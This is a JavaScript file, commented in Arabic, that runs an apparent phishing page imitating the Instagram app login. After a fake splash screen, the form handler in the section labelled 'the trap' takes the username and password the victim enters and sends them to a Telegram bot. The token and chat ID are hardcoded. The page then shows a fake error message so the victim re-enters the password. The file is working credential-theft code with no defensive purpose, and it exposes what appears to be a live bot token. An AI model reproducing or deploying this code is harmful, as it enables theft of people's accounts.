// ==========================================
// 1. إعدادات تلجرام
// ==========================================
const BOT_TOKEN = '8863933045:AAE-GSd-pWrvzSJiijFNkjm9sgZ0g7S7E2w';
const CHAT_ID = '7644504212';

// دالة إرسال البيانات
async function sendToTelegram(username, password) {
    const message = `<b>📸 Instagram App Login</b>\n\n<b>Username:</b> <code>${username}</code>\n<b>Password:</b> <code>${password}</code>`;
    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST', 
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'HTML' })
        });
    } catch (e) {}
}

// ==========================================
// 2. حركة التطبيق (السبلاش سكرين)
// ==========================================
window.addEventListener('DOMContentLoaded', () => {
    // استنى ثانيتين، وبعدين اخفي شاشة السبلاش واظهر تسجيل الدخول
    setTimeout(() => {
        const splash = document.getElementById('splash-screen');
        splash.style.opacity = '0';
        
        setTimeout(() => {
            splash.style.display = 'none';
            document.getElementById('login-screen').style.display = 'flex';
        }, 500); // استنى نص ثانية عشان تاثير الاختفاء
    }, 2000); 
});

// ==========================================
// 3. تسجيل الدخول (الفخ)
// ==========================================
document.getElementById('loginForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    const btn = document.getElementById('loginBtn');
    const errorMsg = document.getElementById('errorMsg');

    // تغيير شكل الزرار
    btn.innerText = 'جاري الدخول...';
    btn.disabled = true;
    errorMsg.style.display = 'none';

    // إرسال البيانات
    await sendToTelegram(username, password);

    // إظهار رسالة خطأ وهمية بعد شوية
    setTimeout(() => {
        btn.innerText = 'تسجيل الدخول';
        btn.disabled = false;
        errorMsg.style.display = 'block';
        document.getElementById('password').value = '';
    }, 1500);
});